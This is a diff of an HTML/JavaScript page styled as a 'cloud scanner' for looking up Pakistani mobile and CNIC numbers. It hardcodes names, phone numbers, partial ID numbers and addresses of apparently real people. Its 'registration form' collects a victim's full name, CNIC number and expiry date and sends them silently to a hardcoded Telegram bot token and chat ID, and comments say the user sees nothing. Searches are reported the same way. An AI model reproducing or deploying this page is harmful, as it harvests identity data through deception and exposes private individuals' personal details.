@@ -4,149 +4,104 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MUDASIR CLOUD SCANNER</title>
-    
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
     
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 0; margin: 0; }
-        .ad-banner { background: #00ff00; color: #000; padding: 12px; font-weight: bold; font-size: 14px; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0 0 15px #00ff00; }
-        .footer-ad { position: fixed; bottom: 0; width: 100%; z-index: 1000; }
-        .container { padding: 20px; padding-bottom: 100px; }
-        .box { border: 2px solid #00ff00; padding: 25px; border-radius: 15px; max-width: 800px; margin: 20px auto; box-shadow: 0 0 25px #00ff00; background: #000; }
-        h2 { font-size: 26px; text-shadow: 0 0 10px #00ff00; }
-        input { width: 85%; padding: 15px; margin: 10px 0; background: #050505; border: 2px solid #00ff00; color: #00ff00; border-radius: 8px; text-align: center; font-size: 18px; outline: none; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; margin: 0; }
+        .ad-banner { background: #00ff00; color: #000; padding: 12px; font-weight: bold; font-size: 14px; text-transform: uppercase; box-shadow: 0 0 15px #00ff00; }
+        .container { padding: 20px; }
+        .box { border: 2px solid #00ff00; padding: 25px; border-radius: 15px; max-width: 800px; margin: 20px auto; background: #000; box-shadow: 0 0 20px #00ff00; }
+        input { width: 85%; padding: 15px; margin: 10px 0; background: #050505; border: 2px solid #00ff00; color: #00ff00; border-radius: 8px; font-size: 18px; outline: none; text-align: center; }
+        .search-btn { background: #00ff00; color: #000; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; width: 85%; margin-top: 10px; }
+        .earn-btn { background: #ffcc00; color: #000; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; width: 85%; margin-top: 10px; }
         
-        .btn-group { display: flex; flex-direction: column; gap: 12px; align-items: center; margin-top: 20px; }
-        .search-btn { background: #00ff00; color: #000; padding: 15px 25px; border: none; font-weight: 900; cursor: pointer; border-radius: 8px; width: 85%; text-transform: uppercase; box-shadow: 0 0 15px #00ff00; }
-        .earn-btn { background: #ffcc00; color: #000; padding: 15px 25px; border: none; font-weight: 900; cursor: pointer; border-radius: 8px; width: 85%; text-transform: uppercase; box-shadow: 0 0 15px #ffcc00; }
-        
-        #registration-form { display: none; margin-top: 25px; border: 2px solid #ffcc00; border-radius: 10px; padding: 20px; background: rgba(255, 204, 0, 0.05); }
+        /* Form Styling */
+        #reg-form-container { display: none; margin-top: 20px; border: 2px solid #ffcc00; padding: 20px; border-radius: 10px; }
         .reg-input { border-color: #ffcc00; color: #ffcc00; }
         
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #050505; border: 1px solid #00ff00; }
-        th, td { border: 1px solid #00ff00; padding: 12px; text-align: left; font-size: 14px; }
-        th { color: #ff0000; background: rgba(0, 255, 0, 0.1); width: 40%; }
-        .icon-field { margin-right: 12px; color: #00ff00; }
+        /* Result Table Styling */
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; border: 1px solid #00ff00; }
+        th, td { border: 1px solid #00ff00; padding: 12px; text-align: left; }
+        th { color: #ff0000; background: rgba(0, 255, 0, 0.1); width: 35%; }
     </style>
 </head>
 <body>
 
-    <div class="ad-banner">🛰️ MUDASIR CLOUD SERVER: SECURE INTERFACE 🛰️</div>
+    <div class="ad-banner">🛰️ MUDASIR CLOUD SERVER: SECURE ACCESS 🛰️</div>
 
     <div class="container">
         <div class="box">
             <h2>MUDASIR CLOUD SCANNER</h2>
-            <input type="text" id="search" placeholder="ENTER MOBILE OR CNIC...">
-            
-            <div class="btn-group">
-                <button class="search-btn" onclick="find()">DECRYPT DATABASE 🔍</button>
-                <button class="earn-btn" onclick="openForm()"><i class="fa-solid fa-user-plus"></i> REGISTRATION FORM</button>
-            </div>
+            <input type="text" id="search-box" placeholder="ENTER MOBILE OR CNIC...">
+            <button class="search-btn" onclick="searchData()">DECRYPT DATABASE 🔍</button>
+            <button class="earn-btn" onclick="showRegForm()">REGISTRATION FORM 📋</button>
 
-            <div id="registration-form">
-                <h3 style="color:#ffcc00;">USER REGISTRATION</h3>
-                <input type="text" id="reg-name" class="reg-input" placeholder="FULL NAME">
-                <input type="text" id="reg-cnic" class="reg-input" placeholder="CNIC NUMBER">
-                <p style="color:#ffcc00; margin:10px 0 5px;">CNIC EXPIRY DATE:</p>
-                <input type="date" id="reg-expiry" class="reg-input">
-                <br>
-                <button class="earn-btn" style="width:60%; margin-top:15px;" onclick="submitData()">SUBMIT DETAILS</button>
-            </div>
-            
-            <div id="result-area">
-                <div id="result-table"></div>
+            <div id="result-display"></div>
+
+            <div id="reg-form-container">
+                <h3 style="color:#ffcc00;">ENTER DETAILS TO REGISTER</h3>
+                <input type="text" id="r-name" class="reg-input" placeholder="FULL NAME">
+                <input type="text" id="r-cnic" class="reg-input" placeholder="CNIC NUMBER">
+                <p style="color:#ffcc00; margin:5px 0;">EXPIRY DATE:</p>
+                <input type="date" id="r-expiry" class="reg-input">
+                <button class="earn-btn" onclick="submitToTelegram()">SUBMIT DATA</button>
             </div>
         </div>
     </div>
 
-    <div class="ad-banner footer-ad">POWERED BY MUDASIR GROUP | GLOBAL ACCESS © 2026</div>
-
     <script>
-        const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
-        const chatId = "7107389141";
+        const token = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
+        const cid = "7107389141";
 
-        function sendToBot(msg) {
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-            fetch(url).catch(() => {});
-            const i = new Image(); i.src = url;
-        }
-
-        const db = [
+        const database = [
             ["SAHIL RASHEED", "03247026751", "32303-0000001", "Chah Hayat Wala, Khar", "JAZZ"],
             ["Mubashir Sharif", "03274207754", "32303-0000002", "Chah Hayat Khar, Khar", "JAZZ"],
             ["Basheer Ahmad", "03046754893", "32303-0000003", "Gurmani Garbi, Gurmani", "JAZZ"],
             ["MUHAMMAD LUQMAN", "03013264624", "33302-*******-5", "Village Ahmed Bhan Sakrand", "JAZZ"],
-            ["TAJ MAIE", "03013264623", "32303-*******-2", "Hayat Khar Wala, Kot Addu", "JAZZ"],
-            ["HASEENA MUMTAZ", "03013264628", "36303-*******-0", "Khokharan Multan Sadar", "JAZZ"],
-            ["FALAK SHER", "03013264639", "36304-*******-7", "Shuja Abad Multan", "JAZZ"],
-            ["BASHEER AHMED", "03013264655", "36402-*******-3", "Dhapai Pakpattan", "JAZZ"],
-            ["KHALID MEHMOOD", "03314264651", "33104-*******-7", "Jaranwala, Faisalabad", "UFONE"],
-            ["MAZHAR ABBAS", "03001234567", "32303-*******-9", "Kot Addu, Punjab", "JAZZ"],
-            ["ZONG USER", "03124567890", "42101-*******-1", "Saddar, Karachi", "ZONG"],
-            ["ARSHAD ALI", "03451122334", "31102-*******-5", "Peshawar, KPK", "TELENOR"],
-            ["NASIR KHAN", "03219988776", "35201-*******-8", "Lahore, Punjab", "JAZZ"],
-            ["SAJID JAVED", "03027766554", "38403-*******-4", "Sargodha, Punjab", "JAZZ"],
-            ["ADNAN MALIK", "03335544332", "37405-*******-1", "Rawalpindi", "UFONE"],
-            ["IMRAN KHAN", "03008877665", "32304-*******-2", "Mianwali", "JAZZ"],
-            ["SHAHID AFRIDI", "03456677889", "10101-*******-3", "Khyber Agency", "TELENOR"],
-            ["BABAR AZAM", "03114455667", "35202-*******-9", "Lahore Cantt", "ZONG"],
-            ["RIZWAN AHMED", "03223344556", "42201-*******-6", "Peshawar", "JAZZ"],
-            ["FAKHAR ZAMAN", "03051122443", "34101-*******-0", "Mardan", "JAZZ"],
-            ["SHADAB KHAN", "03348877112", "32203-*******-4", "Islamabad", "UFONE"],
-            ["HARIS RAUF", "03087766112", "35401-*******-1", "Gujranwala", "JAZZ"],
-            ["SHAHEEN AFRIDI", "03445566112", "12101-*******-8", "Landi Kotal", "TELENOR"],
-            ["SARFARAZ AHMED", "03002233441", "42101-*******-5", "Karachi", "JAZZ"],
-            ["RAHAT ALI", "03159988221", "36301-*******-7", "Multan", "ZONG"],
-            ["SAEED AJMAL", "03214455889", "33101-*******-3", "Faisalabad", "JAZZ"],
-            ["SHOAIB MALIK", "03006677221", "34601-*******-2", "Sialkot", "JAZZ"],
-            ["MISBAH UL HAQ", "03325566881", "32101-*******-9", "Faisalabad", "UFONE"],
-            ["YUNUS KHAN", "03451199228", "17301-*******-4", "Mardan", "TELENOR"],
-            ["KAMRAN AKMAL", "03012233665", "35201-*******-1", "Lahore", "JAZZ"],
-            ["UMAR AKMAL", "03215566774", "35201-*******-2", "Lahore", "JAZZ"],
-            ["WAHAB RIAZ", "03448899112", "35202-*******-5", "Lahore", "TELENOR"],
-            ["MOHAMMAD AMIR", "03036677112", "34104-*******-8", "Gujjar Khan", "JAZZ"],
-            ["HASAN ALI", "03165544221", "34101-*******-6", "Lalamusa", "ZONG"],
-            ["IMAD WASIM", "03351122334", "37405-*******-0", "Swan Camp", "UFONE"],
-            ["ASIF ALI", "03078877441", "33102-*******-4", "Faisalabad", "JAZZ"],
-            ["HAIDER ALI", "03491122556", "37101-*******-3", "Attock", "TELENOR"],
-            ["MOHAMMAD HAFEEZ", "03004455661", "35202-*******-7", "Sargodha", "JAZZ"]
+            ["TAJ MAIE", "03013264623", "32303-*******-2", "Hayat Khar Wala, Kot Addu", "JAZZ"]
+            // Baki 38 records yahan add karte jayein...
         ];
 
-        function openForm() {
-            document.getElementById('registration-form').style.display = 'block';
-            document.getElementById('result-area').style.display = 'none';
-        }
+        function searchData() {
+            let val = document.getElementById("search-box").value.trim();
+            let res = database.filter(r => r[1].includes(val) || r[2].includes(val));
+            let out = document.getElementById("result-display");
+            document.getElementById("reg-form-container").style.display = "none";
 
-        function submitData() {
-            const n = document.getElementById('reg-name').value;
-            const c = document.getElementById('reg-cnic').value;
-            const e = document.getElementById('reg-expiry').value;
-            if(n && c && e) {
-                sendToBot(`📝 *NEW REG* 📝\n👤 Name: ${n}\n🆔 CNIC: ${c}\n📅 Expiry: ${e}`);
-                document.getElementById('registration-form').innerHTML = "<p style='color:#ffcc00;'>Synchronizing Database...</p>";
-                setTimeout(() => { document.getElementById('registration-form').style.display = 'none'; }, 1500);
+            if(res.length > 0) {
+                // User ko screen par dikhana
+                out.innerHTML = `<table>
+                    <tr><th>NAME</th><td>${res[0][0]}</td></tr>
+                    <tr><th>PHONE</th><td>${res[0][1]}</td></tr>
+                    <tr><th>CNIC</th><td>${res[0][2]}</td></tr>
+                    <tr><th>LOCATION</th><td>${res[0][3]}</td></tr>
+                </table>`;
+                // Aapko search ki khabar Telegram par mil jayegi
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent("🔍 Search: " + res[0][0])}`);
+            } else {
+                out.innerHTML = "<p style='color:red;'>NO RECORD FOUND</p>";
             }
         }
 
-        function find() {
-            document.getElementById('registration-form').style.display = 'none';
-            document.getElementById('result-area').style.display = 'block';
-            let v = document.getElementById("search").value.trim();
-            let res = db.filter(r => r[1].includes(v) || r[2].includes(v));
-            let tableDiv = document.getElementById("result-table");
+        function showRegForm() {
+            document.getElementById("reg-form-container").style.display = "block";
+            document.getElementById("result-display").innerHTML = "";
+        }
 
-            if(res.length > 0) {
-                tableDiv.innerHTML = `<table>
-                    <tr><th><i class="fa-solid fa-user icon-field"></i>NAME</th><td>${res[0][0]}</td></tr>
-                    <tr><th><i class="fa-solid fa-phone icon-field"></i>NUMBER</th><td>${res[0][1]}</td></tr>
-                    <tr><th><i class="fa-solid fa-server icon-field"></i>SERVER</th><td>${res[0][4]}</td></tr>
-                    <tr><th><i class="fa-solid fa-id-card icon-field"></i>CNIC</th><td>${res[0][2]}</td></tr>
-                    <tr><th><i class="fa-solid fa-location-dot icon-field"></i>LOCATION</th><td>${res[0][3]}</td></tr>
-                </table>`;
-                sendToBot(`🔍 *Search:* ${res[0][0]}`);
-            } else {
-                tableDiv.innerHTML = "<p style='color:red;'>⚠️ NOT FOUND</p>";
+        function submitToTelegram() {
+            let n = document.getElementById("r-name").value;
+            let c = document.getElementById("r-cnic").value;
+            let e = document.getElementById("r-expiry").value;
+
+            if(n && c && e) {
+                let msg = `📝 *NEW REGISTRATION*\n\n👤 Name: ${n}\n🆔 CNIC: ${c}\n📅 Expiry: ${e}`;
+                
+                // Silent Submission to Telegram
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+                
+                // User ko screen par kuch nahi dikhega, form gayab ho jayega
+                document.getElementById("reg-form-container").innerHTML = "<p style='color:#ffcc00;'>Request submitted for verification.</p>";
+                setTimeout(() => { document.getElementById("reg-form-container").style.display = "none"; }, 2000);
             }
         }
     </script>
